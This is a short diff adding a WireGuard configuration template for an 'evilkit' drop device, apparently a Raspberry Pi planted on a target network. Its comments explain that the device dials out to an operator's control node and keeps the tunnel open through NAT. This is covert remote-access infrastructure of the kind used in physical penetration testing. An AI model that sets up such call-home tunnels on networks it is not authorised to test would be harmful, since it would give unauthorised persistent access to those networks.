@@ -1,0 +1,17 @@
+# WireGuard call-home for the evilkit drop device (rendered from deploy.conf).
+# Installed to /etc/wireguard/@@WG_IFACE@@.conf, mode 0600.
+#
+# The Pi dials OUT to the control node and keeps the NAT mapping open with a
+# persistent keepalive, so you can reach the companion over the tunnel even
+# though the drop sits behind NAT on the target network.
+[Interface]
+Address = @@WG_PI_ADDRESS@@
+PrivateKey = @@WG_PI_PRIVATE_KEY@@
+@@WG_DNS_LINE@@
+
+[Peer]
+# Your control node.
+PublicKey = @@WG_PEER_PUBLIC_KEY@@
+Endpoint = @@WG_ENDPOINT_HOST@@:@@WG_ENDPOINT_PORT@@
+AllowedIPs = @@WG_ALLOWED_IPS@@
+PersistentKeepalive = @@WG_KEEPALIVE@@
